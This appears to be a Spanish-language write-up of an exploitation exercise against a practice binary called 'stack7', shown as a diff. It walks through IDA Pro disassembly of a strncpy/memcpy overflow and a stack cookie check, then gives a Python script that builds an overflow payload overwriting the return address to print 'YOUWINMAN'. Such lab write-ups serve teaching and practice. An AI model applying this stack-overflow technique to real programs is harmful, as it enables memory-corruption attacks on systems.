@@ -1,0 +1,110 @@
+﻿Stack7 by k0ch // 14 julio 2016
+
+Entorno: Windows 7 32bits
+
+En este caso analicé el stack7.idb con IDA PRO 6.8. 
+
+.text:1010108C cmp     [ebp+arg_0], 3
+.text:10101090 jz      short loc_1010
+
+Se necesitan al menos 3 argumentos (contando al nombre del ejecutable)
+
+.text:101010BF push    3Ch             ; Count
+.text:101010C1 mov     edx, 4
+.text:101010C6 shl     edx, 1
+.text:101010C8 mov     eax, [ebp+arg_4]
+.text:101010CB mov     ecx, [eax+edx]
+.text:101010CE push    ecx             ; Source
+.text:101010CF push    offset Dest     ; Dest
+.text:101010D4 call    ds:strncpy
+
+Copia 60 caracteres desde el 3er argumento a Dest (usaremos este para guardar el string "YOUWINMAN")
+
+.text:101010DD mov     edx, 4
+.text:101010E2 shl     edx, 0
+.text:101010E5 mov     eax, [ebp+arg_4]
+.text:101010E8 mov     ecx, [eax+edx]
+.text:101010EB movsx   edx, byte ptr [ecx+8] 
+.text:101010EF cmp     edx, 49h
+
+Compara que el 9no byte del 2do argumento sea 49h
+
+.text:101010F4 mov     [ebp+Size], 54h
+
+agranda el size a 84 caracteres, lo que nos permitirá luego copiar del 2do argumento a Dst por fuera de su tamaño
+
+.text:101010FB mov     eax, [ebp+Size]
+.text:101010FE push    eax             ; Size
+.text:101010FF mov     ecx, 4
+.text:10101104 shl     ecx, 0
+.text:10101107 mov     edx, [ebp+arg_4]
+.text:1010110A mov     eax, [edx+ecx]
+.text:1010110D push    eax             ; Src
+.text:1010110E lea     ecx, [ebp+Dst]
+.text:10101111 push    ecx   
+.text:10101112 call    memcpy   
+
+Copia desde el 2do argumento a Dst
+
+.text:10101153 cmp     [ebp+var_4], 71885A53h
+.text:1010115A jz      short loc_10101
+
+Cookie debe tener el valor \x53\x5A\x88\x71 para pasar la comparación
+
+No olvidemos que debemos escribir YOUWINMAN por pantalla, por lo tanto tendremos que sobreescribir el retorno a través 
+del overflow, y hacer que apunte a una dirección donde tengamos una función print. En nuestro caso puede ser en la 
+siguente línea:
+
+.text:1010114B call    sub_10101180
+
+Otra cosa importante, es que debemos hacer que arg_0 apunte a la dirección donde tenemos nuestro texto YOUWINMAN, ya
+que será el elemento en el top del stack cuando hagamos el retorno a "main"; por lo tanto printf lo tomará como si fuera 
+el primer argumento de la función.
+
+Imprimo el stack para ilustrar el payload:
+
+-00000048 Dst             db ?
+[...]
+-00000014 var_14          dd ?
+-00000010 var_10          dd ?
+-0000000C Size            dd ?
+-00000008 var_8           dd ?
+-00000004 var_4           dd ?
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008 arg_0           dd ?
++0000000C arg_4           dd ?
+
+El script resultante es este:
+
+//---------------------
+
+import subprocess
+
+var_14 = '\x70\x10\x10\x10'
+var_10 = 'xxxx'
+size = 'xxxx'
+var_8 = 'xxxx'
+var_4 = '\x53\x5A\x88\x71'
+s = '\x70\x10\x10\x10'
+r = '\x4B\x11\x10\x10'
+arg_0 = '\x21\x30\x10\x10'
+args = 'stack7v5b.exe ' + 8 * 'x' + '\x49' + 43 * 'x' + var_14 + var_10 + size + var_8 + var_4 + s + r + arg_0 + ' ' + 'YYOUWINMAN'
+subprocess.call(args)
+
+//---------------------
+
+SEE YOU SPACE COWBOY :)
+..k0ch
+
+
+
+
+
+
+
+
+
+
+
+
